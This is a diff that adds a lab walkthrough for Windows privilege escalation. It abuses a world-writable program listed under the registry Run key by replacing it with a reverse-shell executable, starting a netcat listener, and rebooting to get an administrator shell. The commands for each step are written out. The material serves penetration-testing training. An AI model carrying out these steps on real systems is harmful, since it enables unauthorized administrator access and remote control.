@@ -1,0 +1,61 @@
+# 🐾 Task 7: Registry - Autostart
+---
+
+## 📜 Task Description
+In this task, we will exploit a vulnerability in the Windows Registry autostart mechanism. We will examine the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` registry key to find an executable file that is writable by all users. Then, we will replace it with our `reverse.exe` file and gain a reverse shell with administrator privileges.
+
+---
+
+## 🔍 Step 1: Checking Autostart Programs in the Registry
+First, query the `Run` registry key to find executables that start automatically. Execute the following command:  
+`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+
+### 📋 Expected Output
+- Confirm that you see executables listed under the autostart section.  
+![image](https://github.com/user-attachments/assets/53805b6e-dc99-40a1-963f-88bd85a782ae)
+
+---
+
+## 🔑 Step 2: Checking Permissions on the Executable
+Use the `accesschk.exe` tool to verify write permissions on one of the executables listed in the autostart section. Execute the following command:  
+`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
+
+### 📋 Expected Output
+- Confirm that the file `program.exe` is writable by all users.  
+![image](https://github.com/user-attachments/assets/7591fc76-7226-4a3f-99d3-67d9bc4e2f6c)
+
+---
+
+## 📝 Step 3: Replacing the Executable
+Replace the executable `program.exe` with your previously created `reverse.exe`. Run the following command:  
+`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" -Force`
+
+### 📋 Expected Output
+- Confirm that the file has been successfully replaced with `reverse.exe`.
+
+---
+
+## 🎧 Step 4: Setting Up the Listener
+Before restarting the virtual machine, ensure you have a listener running on Kali. Use the following command to start the listener:  
+`nc -lvnp 53`
+
+---
+
+## 🚀 Step 5: Restarting the Machine
+Now, restart the Windows VM to trigger the execution of the `reverse.exe` file on startup. After rebooting, a new RDP session will initiate the reverse shell with administrator privileges.
+
+### 📋 Expected Output
+- Confirm that you have received a reverse shell with administrator privileges.  
+![image](https://github.com/user-attachments/assets/a146981e-2c65-47b9-a2ed-3f254e301997)
+
+---
+
+## 🎉 Congratulations!
+You have successfully exploited the registry autostart mechanism to gain a reverse shell with administrator privileges! 🎊
+
+---
+
+## 📌 Notes
+- Ensure you understand all the steps and their implications.
+- In a real-world scenario, you might have to wait for an administrator to log in to trigger the reverse shell.
+- Use this knowledge responsibly and only within authorized penetration testing engagements.
